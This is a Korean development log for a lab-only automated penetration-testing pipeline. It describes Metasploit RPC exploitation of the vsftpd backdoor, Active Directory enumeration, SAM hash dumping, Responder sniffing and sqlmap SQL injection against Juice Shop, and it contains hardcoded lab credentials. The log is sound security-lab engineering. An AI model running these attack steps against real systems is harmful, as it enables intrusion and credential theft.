각자 exploit+명령을 한 스크립트 안에 다 우겨넣어야 했던 이유. 사용자 지적으로
재설계.

**해결 방식**: `msfrpcd`를 Kali에서 데몬으로 한 번만 띄워두고(자체적으로
fork해서 백그라운드화 - job_runner 입장에선 job이 바로 끝난 걸로 보이지만
실제 프로세스는 독립적으로 계속 삼, 실측 확인), 호스트 Python에서
`pymetasploit3`로 그 데몬에 **네트워크 RPC**로 직접 접속한다(Kali의 hostonly
IP:55553, SSL). guestcontrol을 경유하지 않아서 pwncat-cs 때 겪은 "비대화형
실행 환경이라 pty가 없다"는 문제 자체가 없다(27절). 데몬이 살아있는 한 세션도
계속 살아있으므로, **완전히 별도인 파이썬 프로세스/호출에 걸쳐서도 같은
세션을 이어받아 쓸 수 있다** - exploitation -> post_exploit -> flag_capture ->
lateral_movement이 전부 같은 `session_id`를 재사용 가능.

**API**: `run_exploit()`(모듈 실행 + 새 세션 ID 회수), `run_command()`(세션에
명령 실행 - `pymetasploit3`의 `run_with_output()`이 shell/meterpreter 세션
둘 다 지원함을 실측 확인), `ShellSession` 클래스(`from_exploit()`으로 새로
잡거나 `attach()`로 이미 잡힌 `session_id`를 이어받음).

**실전 검증 상태**: RPC 연결/모듈 로드(`client.modules.use`)/옵션 설정/
`exploit.execute()`/job 추적(`client.jobs.list`)까지는 실측으로 전부 확인했다
(호스트에서 Kali의 msfrpcd에 직접 접속해서 `unix/ftp/vsftpd_234_backdoor`,
`multi/handler` 둘 다 실제로 실행해봄). 다만 "세션 하나를 끝까지 깨끗하게
잡는" 전체 흐름은 아직 매끈하게 재현 못 했다 - vsftpd 백도어가 트리거 후
6200 연결 타이밍에 민감해서 여러 번 실패함(RPC 메커니즘 문제가 아니라 이
특정 레거시 타겟이 이 세션 내내 보여온 것과 같은 불안정성 패턴으로 판단).
**TODO**: 더 안정적인 모듈/타겟으로 end-to-end 세션 획득 재검증.

RPC 인증은 지금 랩 전용 고정 비밀번호(`labpass123`)를 코드에 박아뒀다 - 나중에
`.env`로 옮길 것(TODO, 지금은 격리된 hostonly 네트워크 안에서만 노출되니
당장 급한 문제는 아님).

## 36. AD 랩 완성 — AD-DC01이 goadlab.local 도메인 컨트롤러로 승격 성공

**최종 확인**: `nmap --script ldap-rootdse`로 192.168.56.106의 LDAP(389)을 직접
조회해서 완전히 검증함 - `dnsHostName: AD-DC01.goadlab.local`,
`defaultNamingContext: DC=goadlab,DC=local`, Configuration/Schema/
DomainDnsZones/ForestDnsZones 네이밍 컨텍스트 전부 정상, `isSynchronized: TRUE`.
DNS(53)도 열려서 AD 통합 DNS까지 정상 동작.

**승격 경로에서 겪은 문제와 최종 해법**: 처음엔 호스트(Windows)에서 직접
WinRM으로 붙으려 했으나, 사용자 지적으로 "이 프로젝트는 전부 Kali를 거쳐서
작업한다"는 기존 패턴에 맞게 **Kali에서 `pywinrm`으로 접속하는 방식으로 전환**
(evil-winrm은 대화형 전용이라 자동화에 안 맞아서 제외). 이 과정에서 순서대로
겪은 문제들:
1. 호스트 WinRM 서비스 자체가 미설정 -> `winrm quickconfig` 필요(사용자가 직접
   수행 - 시스템 설정 변경은 에이전트가 못 함, 안전 규칙).
2. 호스트 네트워크 어댑터가 "Public" 프로파일이라 WinRM 방화벽 예외가 안
   걸림 -> **VirtualBox Host-Only 어댑터만** Private로 전환(메인 네트워크는
   그대로 Public 유지 - 보안).
3. Kali의 DNS 리졸버(호스트 NAT 포워더, 75.75.75.75)가 응답 없음 -> 8.8.8.8로
   직접 교체해서 `pywinrm` pip 설치 성공.
4. `Install-ADDSForest`를 WinRM 세션 안에서 동기 실행했더니, 그 명령 자체가
   **재부팅을 유발**해서 WinRM 연결이 끊기고 클라이언트가 응답을 무한 대기함
   (pywinrm에 `operation_timeout_sec`을 걸어도 재현됨) -> **예약 작업(Scheduled
   Task, SYSTEM 권한)으로 우회**: WinRM으로는 스크립트 파일을 쓰고 작업을
   등록+트리거만 하고 끝냄(그 자체는 몇 초짜리 짧은 호출), 실제 승격은 WinRM
   연결과 무관하게 독립적으로 백그라운드에서 진행되게 함.
5. 이후 몇 차례 WinRM 재확인 호출이 "No route to host"/타임아웃 등으로 실패해서
   승격 성공 여부를 한동안 몰랐음 - 하지만 이건 **확인 채널(WinRM)의 문제였을
   뿐, 예약 작업 자체는 계속 백그라운드에서 정상 진행 중이었음**. 결국 nmap으로
   포트(53/389) 직접 확인해서 성공을 뒤늦게 발견함.

**교훈**: 재부팅을 유발하는 원격 작업은 그 연결 자체로 완료를 기다리면 안 되고
(guest_control.py의 nohup+disown, msfconsole 세션 종료 패턴과 같은 원리),
예약 작업/디태치된 프로세스로 트리거만 하고 **별도의, 연결과 무관한 채널
(네트워크 포트 상태 등)로 완료를 폴링**해야 한다는 게 이번에도 확인됨.

**다음 단계**: `ad_enum.py`/`lateral_movement.py`/`sniffing.py`를 이 랩(도메인
`goadlab.local`, DC IP `192.168.56.106`, Administrator/`Goad!Lab2026`)으로 실전
검증할 것 (25절 TODO 해소 시작).

## 37. AD 3모듈 실전 검증 완료 (ad_enum/lateral_movement/sniffing) — 25절 TODO 해소

AD-DC01(`goadlab.local`) 대상으로 전부 실전 검증 완료. 버그 3개 잡음.

### ad_enum.py — 전부 검증됨, 버그 2개
- `enumerate_domain()`: 익명 세션(Null Auth:True는 되지만 공유 열거는 막힘 -
  정상적인 하드닝) + Administrator 인증 세션(공유 5개, 로컬 사용자 3명 정확히
  열거, `(Pwn3d!)` 관리자 판정) 둘 다 확인.
- `find_kerberoast_targets()`: "No entries found!" - 프레시 도메인이라 SPN
  등록된 서비스 계정이 없는 게 맞는 결과.
- `find_asrep_roastable_users()`: Administrator는 사전인증 필요(정상), Guest/
  krbtgt는 계정 비활성화로 정확히 거부됨 - 올바른 보안 설정을 올바르게 탐지.
- `collect_bloodhound_data()` **버그 2개**:
  1. `-dc {IP}`가 "looks like an IP address, but requires a hostname"으로
     실패 - `-dc`를 빼고 `-ns {IP}`(네임서버)만 주면 DNS로 DC를 자동 탐색하게
     수정.
  2. 이 버전 bloodhound-python엔 출력 **디렉터리** 플래그가 아예 없음(`--help`
     확인 - `-op`는 파일명 접두사일 뿐). `-o {dir}`를 줬더니 에러 없이
     조용히 무시되고 결과 파일이 엉뚱한 곳에 생김(`files=[]`로 발견) -
     `-o` 제거하고 `cd {dir} &&`로 작업 디렉터리를 바꿔서 상대경로로
     떨어지게 수정. 수정 후 4명 사용자/52개 그룹/GPO 2개/zip 정상 생성 확인.

### lateral_movement.py — 전부 검증됨, 코드 버그 없음
`try_credential_on_target()`(success/is_admin 정확), `execute_command()`
(`whoami /all` 전체 출력 정상 회수), `dump_local_secrets()`(SAM에서 로컬 계정
NTLM 해시 3개 정확히 확보) 전부 문제 없이 동작. **관찰**: 두 함수에서 각각
한 번씩 원인 불명의 "빈 출력" 결과가 나왔다가 즉시 재시도하면 정상 동작한
경우가 있었음(AS-REP roasting, execute_command 최초 시도) - 재현 안 됨, 코드
버그로 확정 못 함. 랩 환경의 일시적 네트워크/타이밍 흔들림으로 추정, 계속
관찰 필요(TODO).

### sniffing.py — 메커니즘 검증됨, 버그 1개
**버그**: `sudo responder`/`sudo tshark` 호출이 Kali의 sudo가 비밀번호를
요구한다는 걸 반영 안 하고 작성됐었음(작성 당시 가정이 틀렸음 - 20-6절
근처에서 이미 한 번 발견했던 문제였는데 이 모듈엔 미반영 상태였음). `echo
{KALI_PASS} | sudo -S` 방식으로 수정. 수정 후 `sniff_llmnr_nbtns()`/
`sniff_plaintext_auth()` 둘 다 짧은 시간(15~20초) 동안 정상 실행 확인
(`timeout`의 exit_code 124로 정상 종료 확인 - sudo 통과 + 프로세스 정상 구동).
이 프레시 단일-DC 랩엔 자연 발생 LLMNR/평문인증 트래픽이 없어서 실제 해시/
크레덴셜 캡처(0개)까지는 검증 못 함 - 파서 함수(`_parse_responder_hashes`
등)는 이미 합성 데이터로 단위 검증됨(21절 이전 기록). 실제 트래픽 캡처는
멤버 워크스테이션이 추가되면 재검증할 것(TODO).

## 38. OWASP Juice Shop 랩 추가 — web_exploit.py의 SQLi 외 취약점 검증용

`web_exploit.py`가 지금까지는 Kioptrix2(SQLi)로만 검증됐는데, XSS/IDOR/인증
우회/접근제어 같은 SQLi 외 웹 취약점 스펙트럼도 확인해볼 필요가 있어서
OWASP Juice Shop(의도적 취약 현대 웹앱)을 추가했다(24절 TODO 해소).

**구성 결정**: 별도 VM 대신 **Kali에 Docker로 컨테이너 실행**, Kali 자신의
hostonly IP(`192.168.56.101`) 포트 3000에 바로 바인딩(`-p
192.168.56.101:3000:3000`). 별도 IP를 주는 macvlan Docker 네트워크도 검토했으나
- (a) Docker macvlan은 기본적으로 **호스트<->컨테이너 통신이 막히는 알려진
  제약**이 있어(호스트에 추가 macvlan 인터페이스를 또 만들어야 우회 가능),
- (b) VirtualBox 안의 중첩 가상화 환경에서 macvlan이 예상대로 동작할지
  불확실해서, 복잡도 대비 이득이 적다고 판단해 **단순한 포트 바인딩 방식**을
  선택했다.

**트레이드오프**: Kali 자신의 IP를 쓰므로 `recon.py`의
`KNOWN_NON_TARGETS`(Kali IP 제외)에 걸려서 **자동 탐지 대상에는 안 잡힌다** -
`web_exploit.py`/`run_pipeline.py`를 쓸 때 타겟을 `192.168.56.101`, 포트
`3000`으로 수동 지정해야 함. Docker 설치(`apt-get install docker.io`,
`systemctl enable --now docker`, kali 유저를 docker 그룹에 추가해서 sudo 없이
사용) + `bkimminich/juice-shop` 이미지 pull + 컨테이너 기동(`--restart
unless-stopped`로 Kali 재부팅 시 자동 재기동)까지 완료, HTTP 200 확인.

**다음 단계**: `web_exploit.py`(sqlmap `--forms`)로 이 타겟 실전 검증 - 로그인
폼(SQLi 시도) 외에, Juice Shop 특유의 취약점(XSS/IDOR 등)은 지금 코드가 아직
못 잡는 영역이라 별도 확장이 필요할 수 있음(TODO, 검증하면서 판단).

## 39. web_exploit.py 확장 — SPA/JSON API 대응 (`probe_json_endpoint`), Juice Shop 로그인 SQLi 실제 확인

Juice Shop으로 `probe_web_app()`(`sqlmap --forms`)를 그대로 돌려보니 예상대로
**아무것도 못 찾았다**(실측: `"no usable links found (with GET parameters) or
forms"`) - Angular SPA라 서버사이드 `<form>`이 아예 없고 로그인이 JSON REST
API 호출(`POST /rest/user/login`)이라, HTML을 크롤링하는 `--forms`로는 원천적으로
못 찾는 클래스의 앱이었다.

**대응**: `probe_json_endpoint(engagement_id, target, port, path, json_body,
...)` 신설 - 알고 있는 JSON API 엔드포인트를 `sqlmap --data`로 직접 찌른다
(`--forms`처럼 자동 탐지는 아님 - 호출자가 경로/바디를 알아야 함). SPA의 API
엔드포인트를 자동으로 발견하는 기능(JS 렌더링이 필요 - 헤드리스 브라우저
크롤러 영역)은 범위 밖으로 TODO 남김.

**실전에서 잡은 버그 2개**:
1. 로그인 API에 무작위 자격증명을 넣으면 401이 뜨는데, sqlmap이 비2xx 응답을
   "연결 끊김"으로 오판해서 인젝션 테스트 자체를 포기함(sqlmap 로그가 직접
   `--ignore-code` 옵션을 쓰라고 알려줌) - `--ignore-code=401,403`을 기본으로
   추가.
2. `_parse_sqlmap_output()`이 sqlmap의 **최종 요약 블록**만 찾고 있었는데,
   실전에서 risk=3의 무거운 time-based SQLite 페이로드가 **Juice Shop 컨테이너
   자체를 다운시켜서**("Connection refused" 반복 - `--restart unless-stopped`
   로 자동 복구됨, 확인함) 스캔이 최종 요약까지 못 가고 중간에 죽는 경우가
   생겼다. 인젝션 자체는 스캔 도중 이미 확정 메시지로 찍혀 있었음("parameter
   'X' appears to be 'Y' injectable") - 이 인라인 확정 메시지도 파싱하도록
   추가해서, 스캔이 중간에 죽어도 이미 확정된 결과는 놓치지 않게 함.

**최종 결과**: Juice Shop의 유명한 로그인 SQLi(로그인 폼 우회, `email` 필드
boolean-based blind)를 실제로 확인함 - `POST rest/user/login`의 `email`
JSON 필드가 `OR boolean-based blind - WHERE or HAVING clause (NOT)`에 취약.
findings는 기존과 동일하게 `stage="exploitation"`에 남아서 reporting.py에
자동 통합됨(method는 구분을 위해 `SQLi(sqlmap/json)`).

## 40. MCP(Model Context Protocol) 검토 후 기각

정찰/스캔 도구(nmap, gobuster 등)를 MCP 서버로 래핑하고, 실제 파이프라인을
MCP 기반으로 재설계하는 안을 검토했다(이력서/포트폴리오 가치 - "MCP 기반
tool orchestration 설계 경험" - 가 동기). `mcp[cli]` SDK를 설치하고
`mcp_servers/recon_scan_server.py`를 만들어 `scanning.py`의 7개 함수를 MCP
tool로 래핑, 등록까지 확인했다.

**기각 이유**: 1절의 최초 확정 결정과 정면으로 부딪힌다 - 이 프로젝트는
LLM/에이전트가 매 스텝 도구 선택을 판단하는 구조가 아니라, **결정론적
파이썬 함수 체인**(recon → scan → exploit → post_exploit → report)이
뼈대고, LLM은 판정이 필요한 지점(vuln_analysis의 PoC 적합성 평가 등)에만
좁게 투입된다. MCP로 감싸는 것은:
- 이미 직접 호출로 100% 안정적으로 동작하는 함수 호출에 프로토콜 계층(stdio
  client-server, JSON-RPC 메시지 직렬화)을 얹는 것 - 실질적 이득 없이
  실패 지점만 늘어남(직렬화 오류, 프로세스 관리, stdio 파이프 문제 등).
- MCP는 "어떤 도구를 호출할지 LLM이 매번 판단"하는 에이전틱 워크플로우에
  가치가 있는데, 이 파이프라인은 각 단계에서 호출할 함수가 코드상 이미
  고정되어 있어(`run_pipeline.py`의 순서가 곧 로직) 그 가치가 애초에
  발휘될 자리가 없다.
- "이력서 카드"라는 동기 자체가 프로젝트 아키텍처를 왜곡시킬 위험 신호 -
  실제로 필요해서가 아니라 기술 스택 나열을 위해 계층을 추가하는 것.

**결론**: `mcp_servers/` 삭제, 파이프라인은 기존 결정론적 함수 체인 구조
유지. CVE/NVD 실시간 조회(원래 제안의 두 번째 아이디어)는 MCP 없이
`vuln_analysis.py`에 일반 REST API 호출로 통합하는 방향은 여전히 유효한
후보로 남겨둠 -> 41절에서 구현.

## 41. NVD(CVE) 실시간 조회 통합 (`vuln_analysis.py`)

searchsploit의 `codes` 필드는 CVE 번호만 알려주고 심각도(CVSS)는 알려주지
않는다. searchsploit을 ground truth로 우선하는 것과 같은 원칙으로, CVE
번호가 있으면 [NVD REST API](https://nvd.nist.gov/developers/vulnerabilities)에서
공식 CVSS 점수/등급/벡터/설명을 실시간 조회해서 LLM 판정 프롬프트에 결정론적
근거로 추가한다. 40절에서 기각한 MCP 방식이 아니라 `requests`로 직접
호출하는 일반 REST 클라이언트 - 호출 시점/횟수가 코드에 고정돼 있어 MCP가
필요한 "매번 판단" 상황이 아니다.

**구현**: `gather_candidates()`가 searchsploit 매칭을 얻은 직후(LLM 판정
전, 결정론적 수집 단계) `_lookup_cve_details()`로 CVE 번호를 뽑아
`fetch_cve_details()`를 호출, `Candidate.cve_details`에 붙인다.
`_build_prompt()`가 이걸 인용 블록으로 추가해서 LLM이 "이 CVE가 실제로 얼마나
심각한 영향(RCE vs DoS)인지"까지 반영해 rationale을 쓰게 한다.
`candidate_ranked` finding에도 `cve_details`를 같이 남겨서 감사(audit)
추적이 되게 함.

**속도 제한 방어**: NVD 공식 한도는 API 키 있으면 30초당 50건, 없으면
30초당 5건. 후보들이 `ThreadPoolExecutor`로 병렬 판정되므로 동시에 조회하면
쉽게 초과할 수 있어(문서 기준 방어, 실측 아님) 전역 락 + 최소 호출 간격(키
있으면 0.7초, 없으면 6.5초)으로 모든 NVD 호출을 직렬화했다. 후보당 조회
개수도 5개로 상한을 둠. `NVD_API_KEY`는 `.env`에 선택 항목으로 추가(없어도
동작).

**실패 처리**: 네트워크 오류/미등록 CVE/한도초과 등은 전부 `None`으로 조용히
삼킨다 - NVD는 보조 근거일 뿐이라 이게 실패해도 기존 searchsploit 기반 판정
파이프라인은 그대로 진행돼야 한다(exploitation.py 쪽에 영향 없음).

**실측 검증**: `CVE-2011-2523`(vsftpd 2.3.4 백도어, Metasploitable2에서 실제
발견됐던 그 취약점)을 조회해서 `CRITICAL / 9.8 / AV:N,AC:L,...`을 정확히
받아옴을 직접 확인했다.

## 42. MCP 재도입 — 사람 주도 대화형 VM 트러블슈팅 (`mcp_servers/vm_troubleshoot_server.py`)

40절에서 "메인 파이프라인을 MCP로 감싸는 것"은 기각했지만, MCP 자체를
영구히 안 쓰기로 한 건 아니었다 - 기각 사유는 "이 파이프라인은 각 단계에서
호출할 함수가 코드상 이미 고정돼 있어 MCP의 가치(매 스텝 도구 선택을
LLM/사람이 판단)가 발휘될 자리가 없다"는 것이었다. 이 조건이 뒤집히는
지점이 하나 있다: **사람이 MCP 클라이언트(Claude Desktop 등)로 직접 VM에
붙어서 대화형으로 트러블슈팅**하는 경우 - 순서가 애초에 코드에 정해져
있지 않고, 사람이 그때그때 증상을 보고 다음 행동을 고르는 진짜 비결정적
상황이라 MCP가 맞는 자리다.

**설계**: 새 도구를 만들지 않고 `env/setup_doctor.py`(33절 - LLM이 스스로
도구를 골라 도는 에이전틱 루프)와 **완전히 같은 도구 세트/안전 범위**를
MCP 서버로 재노출했다. 차이는 루프를 누가/무엇이 도는지뿐이다:
- `setup_doctor.py`: 이 코드베이스가 `core.llm_client.call_with_tools()`로
  Claude API를 직접 호출해서 루프를 돎 (완전 자동, 사람 개입 없음)
- `vm_troubleshoot_server.py`: 외부 MCP 클라이언트(사람이 채팅으로 붙어
  있는 Claude Desktop 등)가 루프를 돎 (사람이 매 스텝 확인/개입 가능)

도구 6개(`list_vms`, `take_screenshot`, `check_vm_state`,
`vm_power_action`, `check_reachability`, `run_in_kali`) - `setup_doctor.py`의
`TOOLS`에서 `report_diagnosis`만 뺐다(그건 에이전틱 루프의 종료 신호였지,
사람이 붙어 있는 대화 세션엔 불필요). **안전 범위는 그대로 유지**: VM
전원 조작(reset/startvm/poweroff)까지만 허용, 디스크 재구성/설정파일
수정/파일 삭제는 도구 자체가 없음(MCPServer 생성자의 `instructions`
파라미터로 이 범위를 명시 - 서버 차원의 시스템 프롬프트 역할).

**감사(audit) 로그**: 서버 프로세스 기동 시 `new_engagement_id("interactive-
troubleshoot")`로 세션 하나당 인게이지먼트 ID를 하나 발급, 모든 도구 호출을
`stage="mcp_interactive"`로 findings.jsonl에 남긴다 - `setup_doctor.py`가
`stage="setup_doctor"`로 남기는 것과 대칭.

**mcp SDK 사용법 확인**(40절에서 지웠던 걸 다시 씀 - import 경로는 여전히
`mcp.server.mcpserver.MCPServer`): 스크린샷 반환에 `mcp.server.mcpserver.Image`
헬퍼(`Image(path=...)`)가 있어서 base64 인코딩을 직접 안 해도 됨 -
`setup_doctor.py`가 수동으로 하던 base64 인코딩(`_execute_tool`의
`take_screenshot` 분기)보다 간단해짐. `vm_power_action`의 `action`
파라미터는 `Literal["reset","poweroff","startvm"]` 타입 힌트만으로 MCP
스키마에 enum 제약이 자동으로 걸림(Anthropic tool_use의 수동
`"enum": [...]` JSON 스키마 작성과 달리 타입 힌트에서 자동 유도됨).

**실측 검증**: `list_vms`(등록된 VM 5개 - kali 포함 정확히 반환),
`check_vm_state`(kali 대상 실제 `VBoxManage showvminfo` 호출까지 거쳐
`"running"` 정확히 반환) 둘 다 `mcp.call_tool()`로 직접 호출해서 end-to-end
확인. findings.jsonl에 `stage="mcp_interactive"` 레코드가 정확히 남는 것도
확인.

**아직 안 한 것**: Claude Desktop에 실제로 연결해서 사람이 채팅으로 조작하는
것까지는 검증 안 함(stdio transport 자체는 40절에서 이미 별도로
`stdio_client`/`StdioServerParameters` 시그니처 확인까지 했었음) - 다음에
실제 트러블슈팅 상황이 생기면 그때 실전 검증.

## 43. CLI 진행상황 표시 개선 + run_pipeline.py 첫 end-to-end 실전 검증 (+ 발견한 버그 3개)

**동기(사용자 지적)**: 지금까지 파이프라인을 돌릴 때 진행상황을 알 수 있었던
건 옆에서 Claude가 설명해줬기 때문이지, 일반 유저가 터미널만 보고 있으면
똑같이 알 수 있는 게 아니었다 - "일반 유저는 클로드와 함께하고 있지 않을
텐데"라는 지적. 실제로 CLI 화면만으로도 동일하게 보이는지 검증하고, 오래
걸리는 단계(취약점 후보 분석 등)는 하나씩 완료 표시가 되도록 개선했다.

**구현**:
- `core/progress.py`: `_bar()` 추가 - `[■■■■░░░░] 3/8` 형태의 텍스트 진행률
  바. `checklist_start(items)`/`checklist_item(i, total, label)` 추가 -
  "분석 대상 N개" 목록을 먼저 보여주고 하나씩 완료될 때마다 `✓ [i/N]`으로
  체크 표시(사용자 요청: "정찰 후 잠재적 취약점 분석 종류를 보여주면서
  하나씩 완료됐다고 표시"). curses/rich 같은 외부 의존성 없이 plain
  print()만 사용 - 이 프로젝트의 기존 방향과 일치.
- `modules/vuln_analysis.py`(`_judge_all`)/`modules/exploitation.py`
  (`exploit_target`) 둘 다 이 체크리스트를 쓰도록 수정 - 후보 목록을 먼저
  보여주고 판정/시도가 끝날 때마다 체크.
- `env/job_runner.py`(`wait_for_job`): nmap/msfconsole -x/sqlmap처럼 몇 분씩
  걸리는 job이 전부 이 함수 하나를 거쳐가는데, 예전엔 findings.jsonl에만
  진행 상황이 기록되고 콘솔은 완전히 조용했다 - 폴링마다 `core.progress`로
  콘솔에도 하트비트를 찍도록 수정(진행률 신호가 있으면 `X% 진행`, 없으면
  `실행 중...`). 호출자마다 손댈 필요 없이 이 한 곳만 고치면 scanning/
  exploitation/post_exploit/web_exploit 전부 해결됨.

**실전 검증 중 발견한 버그 3개** (run_pipeline.py를 Metasploitable2 대상으로
처음으로 진짜 8단계 전체 end-to-end 실행하면서 실측):

1. **Kali `/tmp`(tmpfs) 100% 가득 참** - 폐기된 pwncat-cs 조사(26절)에서 남은
   리스너 출력 파일 2개(각 ~490MB)가 tmpfs 985M를 거의 다 채워서, job이
   pidfile조차 못 쓰고 "died_unexpectedly"로 조용히 죽고 있었다. job_runner의
   새 콘솔 하트비트를 검증하려고 더미 job(`sleep 20`)을 돌려보다가 발견 -
   하트비트 기능 자체가 아니라 훨씬 근본적인 인프라 문제였다. 두 파일 삭제로
   즉시 해결, 재발 방지로 `env/health_check.py`에 `check_kali_disk()` +
   `cleanup_old_job_files()` 추가 - `/tmp` 사용률이 80% 넘으면 진행 중이 아닌
   (mtime 오래된) job 파일을 자동 정리한다(`run_diagnosis()`에 통합, 메모리
   체크와 나란히).
2. **nmap 진행률 로그가 파일 리다이렉트 시 안 보임** - `/tmp` 정리 후에도
   nmap discovery job이 4분 넘게 도는데 원본 `.out` 파일엔 시작 배너 한 줄뿐,
   `--stats-every 10s`가 찍어야 할 "About X% done" 줄이 전혀 안 보였다.
   원인: stdout이 터미널이 아니라 파일로 리다이렉트되면 대부분의 프로그램이
   라인 버퍼링 대신 블록 버퍼링(4~8KB)으로 바뀌어서, 실제로는 계속 진행
   중이어도 버퍼가 안 차면 디스크에 안 써진다 - `wait_for_job()`의
   progress_regex 정체 감지가 처음부터 진짜 신호를 못 보고 있었다는 뜻(그동안
   "정체 감지"가 찍힌 건 전부 이 버퍼링 때문의 가짜 경보였을 가능성이 높음).
   `env/job_runner.py`의 wrapped 명령에 `stdbuf -oL -eL`을 붙여서 강제 라인
   버퍼링하도록 수정 - 이미 시작된 job엔 소급 적용 안 되므로 다음 스캔부터
   검증됨(빠른 스캔 하나로 부분 테스트했으나 확정적 검증은 못 함 - 다음 전체
   포트 스캔에서 확인 필요).
3. **`detect_platform()`이 Metasploitable2를 windows_standalone으로 오판** -
   이전 세션부터 알려져 있던 미해결 TODO(Linux+Samba 오판)가 실전에서 그대로
   재현됨. 원인: 139/445(SMB) 체크가 22(SSH) 체크보다 먼저였는데, Samba는
   Linux에서도 흔해서 SMB만으로는 Windows를 특정 못 함. 22 체크를 먼저 보도록
   순서를 바꿔서 수정(OpenSSH는 Windows 기본 구성에 거의 없어서 Linux 신호로
   더 강함).

**추가로 발견한 데이터 품질 이슈 (사람의 실수)**: 이 실전 검증 도중 위 버그
3개를 조사하느라 **같은 Kali에 수동으로 병행 작업**(더미 job 실행, disk 정리,
stdbuf 검증용 nmap 재실행)을 했다 - "Kali 작업은 한 번에 하나씩, 병행 전엔
미리 알림" 원칙을 어긴 것. 실제로 이 파이프라인 실행의 Vulnerability Analysis
단계에서 30개 후보 전부 "searchsploit 매칭 0건"이 나왔는데(vsftpd 2.3.4처럼
확실한 CVE가 있는 서비스도 포함), 직후 조용한 상태에서 정확히 같은 쿼리로
수동 재검색하니 정상적으로 매칭됐다(vsftpd 2건, UnrealIRCd 4건) - Kali가 그
시점에 부하(load average 11.8대, 스왑 압박)를 겪고 있어서 `run_in_kali()`의
30초 타임아웃이 조용히 걸렸던 것으로 추정된다. 이걸 명확히 구분할 수 있도록
`search_exploits()`에 `engagement_id`/`port`를 선택적으로 받아 조회 자체가
실패했을 때(`result.ok`가 False) `searchsploit_lookup_failed` 이벤트를 남기게
했다 - "진짜 0건"과 "조회 실패로 인한 0건"이 findings.jsonl에서 이제
구분된다. 체크리스트/진행 표시 라벨도 `service`(짧은 태그) 대신
`banner`(전체 배너)를 쓰도록 바꿔서, 이런 이상 징후가 콘솔에서도 더 눈에
띄게 했다.

**별개로 확인한 진짜 recall 한계 (버그 아님, 개선 여지)**: 조용한 상태에서
재검색해도 `distccd`/`ProFTPD 1.3.1`은 0건이었다 - 원인은 exploit-db 제목이
banner 문자열과 다르게 표기돼서다("DistCC"는 매칭되는데 nmap 배너의
"distccd"는 title에 없음, "ProFTPD 1.2 < 1.3.0" 같은 버전 범위 표기라 정확한
"1.3.1" 문자열 매칭이 실패). searchsploit의 AND 키워드 매칭 자체의 한계라
오늘 범위 밖으로 남겨둠 - 검색어를 못 찾으면 점점 완화(버전 문자열 제거 등)
해서 재시도하는 개선은 추후 과제.

**최종 결과**: 8단계 전부 통과(경과 679초 ≈ 11.3분), 보고서 생성, 대상 VM
정상 종료까지 확인 - `run_pipeline.py` 자체의 첫 성공적인 end-to-end
실행(30절 TODO 해소). 위에서 찾은 3개 버그는 이 세션에서 바로 고쳤고, 데이터
품질 이슈는 원인(사람의 병행 작업)까지 확인했다.

## 44. 로컬 웹 대시보드 (`web_monitor.py`) — CLI와 동일한 진행상황을 브라우저에서도

**사용자 요청**: "웹페이지에 가상의 모니터가 보여지는 것처럼 유저가 확인할
수 있도록" + "스크린샷은 온/오프가 선택 가능하도록(부하 방지)".

**설계**: 완전히 꾸며낸 화면이 아니라, 이미 있는 진짜 데이터(findings.jsonl
+ VBoxManage screenshotpng로 찍은 실제 VM 화면)를 보여주는 라이브 뷰로
만들었다. `Flask`/`FastAPI`/DB/WebSocket 같은 새 인프라를 끌어오지 않고
stdlib `http.server`(`ThreadingHTTPServer`)만으로 - 이 프로젝트가 계속
지켜온 "별도 인프라 안 씀" 기조(LanceDB 선택, MCP 미사용 결정과 같은
방향)와 일치. 프론트엔드는 JS `fetch()` 폴링(진행상황 2초, 스크린샷 4초) -
SSE/WebSocket보다 훨씬 단순한데 이 정도 갱신 주기면 충분.

**API**: `GET /` (대시보드 HTML, 인라인 CSS/JS), `GET /api/engagements`
(등록된 인게이지먼트 목록, 최신순), `GET /api/findings?engagement_id=&since=`
(findings.jsonl 증분 조회 - 매번 전체를 다시 안 보내고 `since` 이후만),
`GET /api/screenshot?vm=` (VBoxManage screenshotpng를 그때그때 찍어서 반환).

**화면 구성**: 전체 진행률 바(등장한 stage 종류 개수로 근사), 취약점 후보
체크리스트(`candidate_judged`/`candidate_ranked` 이벤트 기반, 포트별 최신
판정), 익스플로잇 시도 체크리스트(`exploit_success`/`attempt_failed`
이벤트), 전체 이벤트 로그(원본 findings 흐름), VM 스크린샷(토글 - 기본
꺼짐, VBoxManage 호출 자체가 VM에 부하를 주는 실제 명령이라 사용자 요청대로
꺼둠).

**부가 수정**: `vuln_analysis.py`의 후보 판정 완료 이벤트(`candidate_judged`)
가 예전엔 findings.jsonl에 하나도 안 남고 `analyze()` 끝에 `candidate_ranked`
로 한꺼번에만 남았다 - CLI 콘솔은 `checklist_item()`으로 실시간처럼
보였지만, findings.jsonl을 tail하는 웹 대시보드는 다 끝나고 나서야 한꺼번에
나타나서 체감이 달랐다. 판정 완료 시점마다 실시간으로 남기도록 수정해서
CLI와 웹이 같은 데이터로 같은 타이밍에 갱신되게 함.

**실측 검증**: `.claude/launch.json`에 등록 후 Browser 도구로 실제로 띄워서
확인 - 마침 진행 중이던 43절의 실전 파이프라인 데이터가 그대로 실시간으로
뜨는 것 확인(포트 30개 발견 등). `python web_monitor.py` (기본 포트 8765)로
실행.

## 45. run_pipeline.py 두 번째 실전 재검증 — 진짜 타이밍 버그 발견 (VM 기동 직후 스캔)

43절의 첫 end-to-end 실행은 사람의 실수(검증 중 Kali 병행 작업)로 결과가
오염됐다고 판단해서, 병행 작업 없이 단독으로 재실행했다. 그런데 이번엔
**오염이 아니라 진짜 버그**가 나왔다: 열린 포트가 30개가 아니라 **2개**만
잡혔다(111/rpcbind, 36610/status).

**원인**: `run_pipeline.py`의 "환경 확인" 단계가 VM을 기동한 뒤
`check_target_reachability()`로 **ping 응답**만 확인하고 바로 스캔을
시작했다. 그런데 ping은 커널 네트워크 스택이 뜨자마자 응답하는 반면,
Metasploitable2 같은 옛날 이미지(Ubuntu 8.04 기반)의 실제 서비스들
(vsftpd/apache/mysql/tomcat 등)은 SysV init 스크립트가 순서대로 실행되면서
그보다 한참 늦게 뜬다. 실측: VM 기동 34초 만에 ping 성공 → 그 직후 시작한
`nmap -p-` 풀스캔이 rpcbind(부팅 초반에 뜨는 몇 안 되는 서비스)만 잡고 나머지
28개는 nmap이 각 포트를 지나간 시점에 아직 안 떠 있어서 놓쳤다(`nmap`은 한
포트를 한 번만 찍고 넘어가지, 스캔 도중 새로 열린 포트를 다시 확인하지
않음). `scanning.py`의 기존 재시도 로직("0 hosts up"/전부 filtered일 때만
